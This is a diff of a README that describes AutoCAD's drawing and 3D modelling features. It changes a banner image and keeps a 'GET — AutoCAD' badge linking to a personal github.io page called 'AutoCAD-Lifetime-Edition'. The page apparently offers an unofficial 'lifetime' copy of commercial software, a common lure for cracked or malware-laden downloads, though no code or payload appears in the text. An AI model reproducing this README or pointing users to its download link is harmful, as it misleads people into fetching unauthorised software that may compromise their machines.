@@ -12,7 +12,7 @@ AutoCAD also includes tools for organizing complex drawings, managing reusable c
 
 For 3D work, AutoCAD includes modeling and visualization tools for creating and inspecting three dimensional geometry. These capabilities can help users explore shapes, communicate design intent, and derive technical views from supported models.
 
-![AutoCAD Banner Placeholder](https://down-my.img.susercontent.com/file/my-11134207-820l7-mrx7eovn9f5x93)
+![AutoCAD Banner Placeholder](https://abertech.gr/image/cache/catalog/data/computing/SOFTWARE/autocad26-1000x1000w.png)
 
 [![GET — AutoCAD](https://img.shields.io/badge/GET%20%E2%80%94%20AutoCAD-0078D6?style=for-the-badge&logoColor=white)](https://laurakingg469.github.io/.github/AutoCAD-Lifetime-Edition)
 
